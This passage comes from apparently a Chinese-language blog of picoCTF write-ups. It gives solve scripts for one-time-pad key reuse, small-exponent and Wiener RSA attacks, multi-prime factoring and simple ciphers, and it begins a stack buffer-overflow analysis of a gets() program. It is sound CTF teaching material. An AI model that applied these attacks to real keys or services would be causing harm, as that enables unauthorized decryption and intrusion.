551e6c4c5e55644b56566d1b5100153d4004026a4b52066b4a5556383d4b0007

What data would you like to encrypt?
```

在這題中，我們要先閱讀他給我們的 Code。在 encrypt 函式中我們可以看到一些事情。因為題目給的 Cipher 的長度為 64，又因為他是以十六進制的方式輸出 Cipher，所以我們可以知道他用掉的 `key_location`長度為 32，也就是說，我們下次在加密的時候是用第 33 位開始的 key。

```python
def encrypt(key_location):
    ui = input("What data would you like to encrypt? ").rstrip()
    if len(ui) == 0 or len(ui) > KEY_LEN:
        return -1

    start = key_location  # 這裡從32開始
    stop = key_location + len(ui)

    kf = open(KEY_FILE, "rb").read()

    if stop >= KEY_LEN:
        stop = stop % KEY_LEN
        key = kf[start:] + kf[:stop]
    else:
        key = kf[start:stop]
    key_location = stop

    result = list(map(lambda p, k: "{:02x}".format(ord(p) ^ k), ui, key))

    print("Here ya go!\n{}\n".format("".join(result)))

    return key_location
```

知道了我們第一次輸入要加密的銘文是從第 32 個 key 開始後，我們要想辦法可以使用到跟題目一樣的那組 key，而在程式碼的這個區段我們可以發現一些事。

```python
if stop >= KEY_LEN:
        stop = stop % KEY_LEN
        key = kf[start:] + kf[:stop]
```

在這邊，如果我們讓 `stop`和 `KEY_LEN`相等，讓 `stop % KEY_LEN == 0`的話，`stop`就會被設定為 0，所以我們就可以讓 one-time pad 被重複使用了！所以我們先輸入一堆沒用的字元去填充那個區間段，讓他把第一個 50000 循環結束，再進入一次循環後我們就可以得到跟題目一樣的 key 了。

然後因為他加密的方法是用計算 XOR 的方式，所以我們可以簡單地透過再計算一次 XOR 得到明文，如下:

> $$
> key \oplus pt = ct$$ $$key \oplus ct = pt$$ $$pt \oplus ct = key
> $$

```python
from pwn import *
import binascii  # binascii.unhexlify() is used to convert hex to binary

offset = 50000 - 32

r = remote("mercury.picoctf.net", 11188)

print(r.recvline())
print(r.recvline())
encrypted_flag = r.recvline().strip()

print(encrypted_flag)

r.recvuntil(b"?")
r.sendline(b"A" * offset)
r.recvuntil(b"?")
r.sendline(b"A" * 32)
r.recvline()

encoded = r.recvline().strip()
encoded = binascii.unhexlify(encoded)

message = "A" * 32
key = []
for i in range(len(encoded)):
    key.append(ord(message[i]) ^ encoded[i])

flag = []
encrypted_flag = binascii.unhexlify(encrypted_flag)
for i in range(len(encrypted_flag)):
    flag.append(chr(key[i] ^ encrypted_flag[i]))

flag = "".join(flag)
print(flag)
```

## Custom encryption

這題給了兩個檔案。一個是加密後的 flag，裡面還包含了加密需要的一些變量；另一個是加密腳本。既然給了腳本，那就先來看看 Code 吧。我結合了題目給的加密後的 flag 的資訊，把註解直接寫在了代碼裡面，看看吧！

```python
from random import randint
import sys


def generator(g, x, p):
    return pow(g, x) % p


# 密文 = 明文的每個字元ASCII碼 * 密鑰 * 311並append到一個list
def encrypt(plaintext, key):
    cipher = []
    for char in plaintext:
        cipher.append(((ord(char) * key * 311)))
    return cipher


def is_prime(p):
    v = 0
    for i in range(2, p + 1):
        if p % i == 0:
            v = v + 1
    if v > 1:
        return False
    else:
        return True


def dynamic_xor_encrypt(plaintext, text_key):
    cipher_text = ""
    key_length = len(text_key)
    for i, char in enumerate(plaintext[::-1]):  # 從明文的末尾開始
        key_char = text_key[i % key_length]  # 循環text_key裡面每個字元
        encrypted_char = chr(ord(char) ^ ord(key_char))  # 對應的密文 = 明文 ^ 密鑰
        cipher_text += encrypted_char
    return cipher_text


def test(plain_text, text_key):
    p = 97
    g = 31
    if not is_prime(p) and not is_prime(g):
        print("Enter prime numbers")
        return
    a = randint(p - 10, p)
    b = randint(g - 10, g)
    print(f"a = {a}")
    print(f"b = {b}")

    # a = 89
    # b = 27
    # p = 97
    # g = 31
    u = generator(g, a, p)  # u = 31 ** 89 % 97 = 49
    v = generator(g, b, p)  # u = 31** 27 % 97 = 85
    key = generator(v, a, p)  # key = 85 ** 89 % 97 = 12
    b_key = generator(u, b, p)  # b_key = 49 ** 27 % 97 = 12
    shared_key = None
    if key == b_key:
        shared_key = key  # shared_key = 12
    else:
        print("Invalid key")
        return
    semi_cipher = dynamic_xor_encrypt(plain_text, text_key)
    cipher = encrypt(semi_cipher, shared_key)
    print(f"cipher is: {cipher}")


if __name__ == "__main__":
    message = sys.argv[1]
    test(message, "trudeau")
```

由上面的代碼可以知道，它是經過了兩次的加密，一次是把明文反過來並讓其對 `text_key`循環做 XOR，第二次是把第一次加密得到的東西轉 ASCII 並乘以 key 再乘以 311。

解密的話就反過來，先去除以 311 再除以 key（這裡為 12），得到一個半密文（semi_cipher）。接下來這個半密文要先反轉，再用它寫好的 function 去做 XOR（因為它的 function 裡面又有一次反轉，所以這樣剛好會是和加密時相同的順序），最後得到的這個明文還要再反轉一次，才會得到正確的 flag。至於為甚麼要反轉兩次，解釋如下：

```txt
假設題目的dynamic_xor_encrypt為f，明文為ABC

加密：
f(ABC, KEY) = C'B'A'

解密：
第一次反轉，把C'B'A變為A'B'C，所以在f裡就會計算C'B'A對KEY的XOR
f(A'B'C, KEY) = CBA
第二次反轉，把CBA轉為ABC
flag = ABC
```

希望這樣解釋有比較清楚一點！總之照這樣解密就可以得到 flag 啦，以下是我的解密的代碼：

```python
def decrypt(cipher: list, key: int, text_key: str) -> str:
    semi_cipher = ""
    for encrypted_value in cipher:
        decrypted_value = encrypted_value // (key * 311)  # 使用 // 返回int
        semi_cipher += chr(decrypted_value)
    semi_cipher = semi_cipher[::-1]  # 將密文反轉
    plaintext = dynamic_xor_encrypt(semi_cipher, text_key)
    return plaintext


cipher = [
    33588,
    276168,
    261240,
    302292,
    343344,
    328416,
    242580,
    85836,
    82104,
    156744,
    0,
    309756,
    78372,
    18660,
    253776,
    0,
    82104,
    320952,
    3732,
    231384,
    89568,
    100764,
    22392,
    22392,
    63444,
    22392,
    97032,
    190332,
    119424,
    182868,
    97032,
    26124,
    44784,
    63444,
]
plaintext = decrypt(cipher, 12, "trudeau")  # since we know the key is 12
print(f"plaintext is: {plaintext[::-1]}")
```

```txt
picoCTF{custom_d2cr0pt6d_dc499538}
```

## Mini RSA

題目給了一組 RSA 加密的密文，還有公鑰（n, e），如下。

```txt
N: 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287
e: 3

ciphertext (c): 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106
```

不難發現，這題的公鑰指數 e 超小，只有 3。所以我們使用小公鑰指數攻擊（Coppersmith's attack, Low public exponent attack）。由於題目有說$m^e$略大於$n$，故其解題原理如下（$c$為密文，$m$為明文，$e$是公鑰指數，$n$是公鑰模數）：

$c=m^e\mod n$

$m^e=k\times n+c$

$\text{Bruteforce k and find the eth root of }k\times n+c$

為了計算明文，我寫了一個 Python 腳本，如下。

```python
import gmpy2
from Crypto.Util.number import long_to_bytes

# 宣告題目所給的n, e, c
n = 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287
e = 3
c = 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106

# 暴力破解 k * n + c 的 e 次方根
k = 0
while True:
    m, is_root = gmpy2.iroot(k * n + c, e)
    if is_root:
        break
    else:
        k += 1

# 數字轉字串
print(long_to_bytes(m).decode())
```

執行後就可以找到 flag 啦～

![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702161343132.png)

```txt
picoCTF{e_sh0u1d_b3_lArg3r_7adb35b1}
```

## miniRSA

這題的原理和上面那題一模一樣，都是 e 太小所以用小公鑰指數攻擊。想知道更詳細原理看[上面那題](http://localhost:4000/CTF/All-in-One%20PicoCTF-Writeups/#Mini-RSA)，這邊直接上 Exploit。

```python
import gmpy2
from Crypto.Util.number import long_to_bytes

# 宣告題目所給的n, e, c
n = 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673
e = 3
c = 2205316413931134031074603746928247799030155221252519872650080519263755075355825243327515211479747536697517688468095325517209911688684309894900992899707504087647575997847717180766377832435022794675332132906451858990782325436498952049751141
# 暴力破解 k * n + c 的 e 次方根
k = 0
while True:
    m, is_root = gmpy2.iroot(k * n + c, e)
    if is_root:
        break
    else:
        k += 1

# 數字轉字串
print(long_to_bytes(m).decode())
```

```txt
picoCTF{n33d_a_lArg3r_e_d0cd6eae}
```

## b00tl3gRSA2

這題給了一個 Netcat 連接方式 `nc jupiter.challenges.picoctf.org 57464`。先連進去主機看看吧。連進去後可以得到公鑰（e, n）跟密文 C。

```txt
c: 34445152657892770965998909208982810010756495888304322276986171688963957553047312382212965383503534206383273951160130679579064667281298014647933151624988393675732505770685953145935008017740630822545491396331269103186466894080672218590474311310524848042116230603776754439341606635542489964403857509012413327600
n: 68119657260892882095325897664190568273401102037961904922092525598421583896728037063388427153386051029888075348478917163527609699475528597669779479757588723783858410926089233944915463760773669961431608182207070211704104302242228666666950454789023679482670607533342993172566630254264627616929496230133089420521
e: 37080866881034431981182406871995949206609767233841813908107646836499839869322256469420054910921271502986970536597423895034064361029486896285600240175045808110268909882526287214985406985265436522819284777174250321264328876332147142628536767687999620602780344780826878645902905435208326564999474536627301460973
```

在題目的描述中他說：

> In RSA d is a lot bigger than e, why don't we use d to encrypt instead of e?

意思是在這題裡面他把 $d$ 和 $e$ 互換了，用 $d$ 來加密 $e$。下面這篇文章有詳細說了為甚麼不應該使用這種做法。

- [RSA: Does it matter if you use e or d to encrypt?](https://crypto.stackexchange.com/questions/54557/rsa-does-it-matter-if-you-use-e-or-d-to-encrypt)

簡而言之，當私鑰指數（$d$）比較小的時候，可以使用[Wiener's attack](https://en.wikipedia.org/wiki/Wiener%27s_attack)。這邊可以使用一個開源工具來幫助我們快速執行攻擊。

- [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)

使用方式請查看官方文檔。總之 Exploit 如下。

```bash
python RsaCtfTool.py -e 37080866881034431981182406871995949206609767233841813908107646836499839869322256469420054910921271502986970536597423895034064361029486896285600240175045808110268909882526287214985406985265436522819284777174250321264328876332147142628536767687999620602780344780826878645902905435208326564999474536627301460973 -n 68119657260892882095325897664190568273401102037961904922092525598421583896728037063388427153386051029888075348478917163527609699475528597669779479757588723783858410926089233944915463760773669961431608182207070211704104302242228666666950454789023679482670607533342993172566630254264627616929496230133089420521 --decrypt 34445152657892770965998909208982810010756495888304322276986171688963957553047312382212965383503534206383273951160130679579064667281298014647933151624988393675732505770685953145935008017740630822545491396331269103186466894080672218590474311310524848042116230603776754439341606635542489964403857509012413327600 --attack wiener
```

![Pwned!](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240707150749451.png)

總之就是把參數都設定好，就可以成功得到 Flag 了。

```txt
picoCTF{bad_1d3a5_2152720}
```

## b00tl3gRSA3

這題和上一題一樣，先用 Netcat 連線到主機，得到資訊如下。

```txt
c: 1155413374658603081887942538070618568058048531029758454280998255793925425541835159695263849863790503010031220771999047690488595295467625987010931696477313386062384452816188902386984531395080585643524053777943484599038478398898775019494628236550977835910935567524611329303821647514235510296512723444159728500460371101677191814101634547011569775
n: 3009815969095519381043948515174929441467634594821498333858615496361783804562611599728570248270874306617036697889577813844217713194056663725350522605669349001546826005570895246471872723077264759401472551915667965016802426155245585986786567513487278588996436597960321248870612409759311004096684257474660765774013406405351078796165091907796029759
e: 65537
```

題目說了

> Why use p and q when I can use more?

意思是，這題的初始質數不只有 $p$ 和 $q$。所以我們只要找到歐拉函數 $\phi(n)$，並且正常走流程就可以了。由於他不只有 $p$ 和 $q$ 兩個質數，分解起來會容易很多。Exploit 如下。

```python
from sympy.ntheory import factorint
from Crypto.Util.number import long_to_bytes


def get_phi(n):
    f = factorint(n) # 返回一個字典，key為質因數，value為該質因數的冪
    phi = 1
    for a, b in f.items():
        phi *= pow(a, b - 1) * (a - 1)
    return phi


# 宣告題目給的資訊
c = 1155413374658603081887942538070618568058048531029758454280998255793925425541835159695263849863790503010031220771999047690488595295467625987010931696477313386062384452816188902386984531395080585643524053777943484599038478398898775019494628236550977835910935567524611329303821647514235510296512723444159728500460371101677191814101634547011569775
n = 3009815969095519381043948515174929441467634594821498333858615496361783804562611599728570248270874306617036697889577813844217713194056663725350522605669349001546826005570895246471872723077264759401472551915667965016802426155245585986786567513487278588996436597960321248870612409759311004096684257474660765774013406405351078796165091907796029759
e = 65537

phi = get_phi(n)
d = pow(e, -1, phi)
m = pow(c, d, n)

print(long_to_bytes(m))
```

這邊的 `get_phi(n)`是用到了以下的求歐拉函數的公式：

$\phi(n) = p_1^{k_1 - 1} \times (p_1 - 1) \times p_2^{k_2 - 1} \times (p_2 - 1) \times \cdots \times p_m^{k_m - 1} \times (p_m - 1)$

這樣求出來 $\phi(n)$ 後就可以用正常計算流程找到明文 $m$ 了。

```txt
picoCTF{too_many_fact0rs_8606199}
```

## Vigenere

這題給了一個加密後的密文跟Key，然後題目也告訴我們是Vigenere Cipher，直接拿去Online decoder解就行。（我也不知道為甚麼他難度是Medium LMAO）

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240902145151045.png)

```txt
picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_d85729g7}
```

## Pixelated

這題給了兩張圖片，並且是一個叫做Visual Cryptography的東西。題目圖片如下。

![scrambled1](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/scrambled1.png)

![scrambled2](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/scrambled2.png)

這邊我用[Stegsolve](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install)去Combine兩張圖片。先打開第一張圖片後點選 Analyze > Image Combiner，再點選第二張圖片。之後它會跳出一個介面讓你選擇Combine的方式，預設是XOR，一直點向右的箭頭直到方法變成ADD的時候就可以看到Flag啦。

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240902152127776.png)

```txt
picoCTF{d562333d}
```

解完後我有看了一下其他人的Writeups，我發現有人是用Python解的覺得很酷，附上來給大家看看。（[Writeup](https://ctftime.org/writeup/28930)）

```python
# import Image
from PIL import Image

# open both photos
i1 = Image.open('scrambled1.png')
i2 = Image.open('scrambled2.png')

# get width and height
width1, height1 = i1.size

# open new image
i3 = Image.new('RGB', (width1, height1))

# load the pixels
pixels = i3.load()

# loop through all pixels
for i in range(width1):
    for j in range(height1):
        # xor the values
        x = i1.getpixel((i,j))[0] ^ i2.getpixel((i,j))[0]
        y = i1.getpixel((i,j))[1] ^ i2.getpixel((i,j))[1]
        z = i1.getpixel((i,j))[2] ^ i2.getpixel((i,j))[2]

        # if all white then convert to black
        if (x,y,z) == (255,255,255):
            (x,y,z) = (0,0,0)

        # put the new pixels in place
        i3.putpixel((i,j), (x,y,z))

# save the image
i3.save("test.png", "PNG")
```

## HideToSee

這題給了一個圖片，圖片上寫的字說這是一個Atbash Cipher，查了一下，就是一種把字母順序反過來的Substitution Cipher。提示有說要Extract it，所以猜測是用Steghide，這邊先把資料提取出來。

```bash
steghide extract -sf atbash.jpg
```

這會提取出一個`encrypted.txt`文件，看一下內容。

```txt
krxlXGU{zgyzhs_xizxp_8z0uvwwx}
```

直接把這個拿去[網路上的解密工具](https://www.dcode.fr/atbash-cipher)，Flag就出來了。

```txt
picoCTF{atbash_crack_8a0feddc}
```

## college-rowing-team

這題給了一個加密腳本和一個密文（含公鑰），先來看看加密腳本`encrypt.py`。

```python
#!/usr/bin/env python3

import random
from Crypto.Util.number import getPrime, bytes_to_long


with open("flag.txt", "rb") as f:
    flag = f.read()

msgs = [
    b"I just cannot wait for rowing practice today!",
    b"I hope we win that big rowing match next week!",
    b"Rowing is such a fun sport!",
]

msgs.append(flag)
msgs *= 3
random.shuffle(msgs)

for msg in msgs:
    p = getPrime(1024)
    q = getPrime(1024)
    n = p * q
    e = 3
    m = bytes_to_long(msg)
    c = pow(m, e, n)
    with open("encrypted-messages.txt", "a") as f:
        f.write(f"n: {n}\n")
        f.write(f"e: {e}\n")
        f.write(f"c: {c}\n\n")
```

雖然他把一些訊息跟Flag打亂在一起了，不知道哪個才是我們要的。但可以看到他的公鑰指數`e`都固定設為3，那就可以用**小公鑰指數攻擊**試試，把每一組都爆出來啦！接著我們看看密文`encrypted-message.txt`。

```txt
n: 12426348204210593270343924563278821305386892683425418957350363905840484905896816630189546938112358425679727243103082954824537007026886458498690134225705484501535835385800730412220192564706251228021192115494699150390312107794005569764411063907390563937247515046052549753641884721864426154021041082461015103337120756347692245843318676049947569653604616584167536958803278688355036036887022591104659059883622072052793378468850702811804337808760402077376453702190206077039468600466511349923882037572540505571672225260106649075841827340894515208811788428239691505001675042096850318994923571686175381862745049100863883977473
e: 3
c: 5065488652323342174251548936130018278628515304559137485528400780060697119682927936946069625772269234638180036633146283242714689277793018059046463458498115311853401434289264038408827377579534270489217094049453933816452196508276029690068611901872786195723358744119490651499187556193711866091991489262948739533990000464588752544599393

n: 19928073532667002674271126242460424264678302463110874370548818138542019092428748404842979311103440183470341730391245820461360581989271804887458051852613435204857098017249255006951581790650329570721461311276897625064269097611296994752278236116594018565111511706468113995740555227723579333780825133947488456834006391113674719045468317242000478209048237262125983164844808938206933531765230386987211125968246026721916610034981306385276396371953013685639581894384852327010462345466019070637326891690322855254242653309376909918630162231006323084408189767751387637751885504520154800908122596020421247199812233589471220112129
e: 3
c: 86893891006724995283854813014390877172735163869036169496565461737741926829273252426484138905500712279566881578262823696620415864916590651557711035982810690227377784525466265776922625254135896966472905776613722370871107640819140591627040592402867504449339363559108090452141753194477174987394954897424151839006206598186417617292433784471465084923195909989

n: 13985338100073848499962346750699011512326742990711979583786294844886470425669389469764474043289963969088280475141324734604981276497038537100708836322845411656572006418427866013918729379798636491260028396348617844015862841979175195453570117422353716544166507768864242921758225721278003979256590348823935697123804897560450268775282548700587951487598672539626282196784513553910086002350034101793371250490240347953205377022300063974640289625028728548078378424148385027286992809999596692826238954331923568004396053037776447946561133762767800447991022277806874834150264326754308297071271019402461938938062378926442519736239
e: 3
c: 86893891006724995283854813014390877172735163869036169496565461737741926829273252426484138905500712279566881578262823696620415864916590651557711035982810690227377784525466265776922625254135896966472905776613722370871107640819140591627040592402867504449339363559108090452141753194477174987394954897424151839006206598186417617292433784471465084923195909989

n: 19594695114938628314229388830603768544844132388459850777761001630275366893884362012318651705573995962720323983057152055387059580452986042765567426880931775302981922724052340073927578619711314305880220746467095847890382386552455126586101506301413099830377279091457182155755872971840333906012240683526684419808580343325425793078160255607072901213979561554799496270708954359438916048029174155327818898336335540262711330304350220907460431976899556849537752397478305745520053275803008830388002531739866400985634978857874446527750647566158509254171939570515941307939440401043123899494711660946335200589223377770449028735883
e: 3
c: 5065488652323342174251548936130018278628515304559137485528400780060697119682927936946069625772269234638180036633146283242714689277793018059046463458498115311853401434289264038408827377579534270489217094049453933816452196508276029690068611901872786195723358744119490651499187556193711866091991489262948739533990000464588752544599393

n: 12091176521446155371204073404889525876314588332922377487429571547758084816238235861014745356614376156383931349803571788181930149440902327788407963355833344633600023056350033929156610144317430277928585033022575359124565125831690297194603671159111264262415101279175084559556136660680378784536991429981314493539364539693532779328875047664128106745970757842693549568630897393185902686036462324740537748985174226434204877493901859632719320905214814513984041502139355907636120026375145132423688329342458126031078786420472123904754125728860419063694343614392723677636114665080333174626159191829467627600232520864728015961207
e: 3
c: 301927034179130315172951479434750678833634853032331571873622664841337454556713005601858152523700291841415874274186191308636935232309742600657257783870282807784519336918511713958804608229440141151963841588389502276162366733982719267670094167338480873020791643860930493832853048467543729024717103511475500012196697609001154401

n: 19121666910896626046955740146145445167107966318588247850703213187413786998275793199086039214034176975548304646377239346659251146907978120368785564098586810434787236158559918254406674657325596697756783544837638305550511428490013226728316473496958326626971971356583273462837171624519736741863228128961806679762818157523548909347743452236866043900099524145710863666750741485246383193807923839936945961137020344124667295617255208668901346925121844295216273758788088883216826744526129511322932544118330627352733356335573936803659208844366689011709371897472708945066317041109550737511825722041213430818433084278617562166603
e: 3
c: 38999477927573480744724357594313956376612559501982863881503907194813646795174312444340693051072410232762895994061399222849450325021561935979706475527169503326744567478138877010606365500800690273

n: 13418736740762596973104019538568029846047274590543735090579226390035444037972048475994990493901009703925021840496230977791241064367082248745077884860140229573097744846674464511874248586781278724368902508880232550363196125332007334060198960815141256160428342285352881398476991478501510315021684774636980366078533981139486237599681094475934234215605394201283718335229148367719703118256598858595776777681347337593280391052515991784851827621657319164805164988688658013761897959597961647960373018373955633439309271548748272976729429847477342667875183958981069315601906664672096776841682438185369260273501519542893405128843
e: 3
c: 38999477927573480744724357594313956376612559501982863881503907194813646795174312444340693051072410232762895994061399222849450325021561935979706475527169503326744567478138877010606365500800690273

n: 11464859840071386874187998795181332312728074122716799062981080421188915868236220735190397594058648588181928124991332518259177909372407829352545954794824083851124711687829216475448282589408362385114764290346196664002188337713751542277587753067638161636766297892811393667196988094100002752743054021009539962054210885806506140497869746682404059274443570436700825435628817817426475943873865847012459799284263343211713809567841907491474908123827229392305117614651611218712810815944801398564599148842933378612548977451706147596637225675719651726550873391280782279097513569748332831819616926344025355682272270297510077861213
e: 3
c: 38999477927573480744724357594313956376612559501982863881503907194813646795174312444340693051072410232762895994061399222849450325021561935979706475527169503326744567478138877010606365500800690273

n: 21079224330416020275858215994125438409920350750828528428653429418050688406373438072692061033602698683604056177670991486330201941071320198633550189417515090152728909334196025991131427459901311579710493651699048138078456234816053539436726503461851093677741327645208285078711019158565296646858341000160387962592778531522953839934806024839570625179579537606629110275080930433458691144426869886809362780063401674963129711723354189327628731665487157177939180982782708601880309816267314061257447780050575935843160596133370063252618488779123249496279022306973156821343257109347328064771311662968182821013519854248157720756807
e: 3
c: 301927034179130315172951479434750678833634853032331571873622664841337454556713005601858152523700291841415874274186191308636935232309742600657257783870282807784519336918511713958804608229440141151963841588389502276162366733982719267670094167338480873020791643860930493832853048467543729024717103511475500012196697609001154401

n: 22748076750931308662769068253035543469890821090685595609386711982925559973042348231161108618506912807763679729371432513862439311860465982816329852242689917043600909866228033526990181831690460395726449921264612636634984917361596257010708960150801970337017805161196692131098507198455206977607347463663083559561805065823088182032466514286002822511854823747204286303638719961067031142962653536148315879123067183501832837303731109779836127520626791254669462630052241934836308543513534520718206756591694480011760892620054163997231711364648699030108110266218981661196887739673466188945869132403569916138510676165684240183111
e: 3
c: 5065488652323342174251548936130018278628515304559137485528400780060697119682927936946069625772269234638180036633146283242714689277793018059046463458498115311853401434289264038408827377579534270489217094049453933816452196508276029690068611901872786195723358744119490651499187556193711866091991489262948739533990000464588752544599393

n: 15211900116336803732344592760922834443004765970450412208051966274826597749339532765578227573197330047059803101270880541680131550958687802954888961705393956657868884907645785512376642155308131397402701603803647441382916842882492267325851662873923175266777876985133649576647380094088801184772276271073029416994360658165050186847216039014659638983362906789271549086709185037174653379771757424215077386429302561993072709052028024252377809234900540361220738390360903961813364846209443618751828783578017709045913739617558501570814103979018207946181754875575107735276643521299439085628980402142940293152962612204167653199743
e: 3
c: 301927034179130315172951479434750678833634853032331571873622664841337454556713005601858152523700291841415874274186191308636935232309742600657257783870282807784519336918511713958804608229440141151963841588389502276162366733982719267670094167338480873020791643860930493832853048467543729024717103511475500012196697609001154401

n: 21920948973299458738045404295160882862610665825700737053514340871547874723791019039542757481917797517039141169591479170760066013081713286922088845787806782581624491712703646267369882590955000373469325726427872935253365913397944180186654880845126957303205539301069768887632145154046359203259250404468218889221182463744409114758635646234714383982460599605335789047488578641238793390948534816976338377433533003184622991479234157434691635609833437336353417201442828968447500119160169653140572098207587349003837774078136718264889636544528530809416097955593693611757015411563969513158773239516267786736491123281163075118193
e: 3
c: 86893891006724995283854813014390877172735163869036169496565461737741926829273252426484138905500712279566881578262823696620415864916590651557711035982810690227377784525466265776922625254135896966472905776613722370871107640819140591627040592402867504449339363559108090452141753194477174987394954897424151839006206598186417617292433784471465084923195909989


```

好！那既然看加密腳本已經發現了他的弱點，那就直接來寫Exploit吧。

```python
import gmpy2
from Crypto.Util.number import long_to_bytes


def decrypt(cipher: dict) -> str:
    e = cipher["e"]
    n = cipher["n"]
    c = cipher["c"]
    k = 0
    while True:
        m, is_root = gmpy2.iroot(k * n + c, e)
        if is_root:
            break
        else:
            k += 1
    return long_to_bytes(m).decode()


with open(r"encrypted-messages.txt", "r") as f:
    file = f.read()

file = file.split("\n\n")
file.pop()

ciphers = []
for c in file:
    cipher = {}
    c = c.split("\n")
    for item in c:
        key, value = item.split(": ")
        cipher[key] = int(value)
    ciphers.append(cipher)

plaintext = ""
for cipher in ciphers:
    plaintext += decrypt(cipher) + "\n"

print(plaintext)
```

Voila! Flag就出來啦~

```txt
picoCTF{1_gu3ss_p30pl3_p4d_m3ss4g3s_f0r_4_r34s0n}
```

# Pwn (Binary Exploitation)

## Local Target

這題給了一個可執行的檔案和 C 語言的代碼，先來分析一下他的代碼吧。

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;

  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");

  printf("num is %d\n", num);
  fflush(stdout);

  if (num == 65)
  {
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
      printf("Cannot open file.\n");
      fflush(stdout);
      exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
      printf("%c", c);
      c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }

  printf("Bye!\n");
  fflush(stdout);
}
```

當使用 Netcat 連線到題目的時候，會如同下面一般。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701161031231.png)

**分析代碼**

1. `char input[16];`宣告了一個長度為 16 的字元陣列，儲存使用者輸入。
2. `gets(input);`獲取使用者輸入，由於 `gets`函數不檢查輸入的長度，使用者可以輸入超過 16 個字元。（[危险函数 gets()几种完美的替代方法 你可能还不知道的](https://blog.csdn.net/qq_40907279/article/details/89046366)）
3. `int num = 64;`宣告並初始化變數 `num`。
4. 拿到 flag 的條件是要讓 num 的值為 65。

這邊我們可以用 `man gets`指令進入 gets 的 man 手冊頁，看一下他的 bug 區塊，了解 gets 到底危險在哪裡。

![Bug of gets function](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702142351553.png)

**BOF 攻擊**

首先，先檢查一下他有沒有任何保護機制。

![Checksec from pwntools](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701171059944.png)

他沒有 [Canary](https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/) 也沒有 [PIE](https://ithelp.ithome.com.tw/articles/10336777)，就正常做 BOF 就可以了。

因為 `input`和 `num`都是區域變數，所以會存在 Stack 中。並且因為是先宣告 `input`緊接著宣告 `num`，所以在 Stack 中會像下面這樣：

```txt
High Address
|
|---------------------|
|  Return Address     | <-- top
|---------------------|
|  Frame Pointer      |
|---------------------|
|  int num            | <-- 4 Bytes
|---------------------|
|  char input[16]     | <-- 16 Bytes
|---------------------|
|
Low Address
```

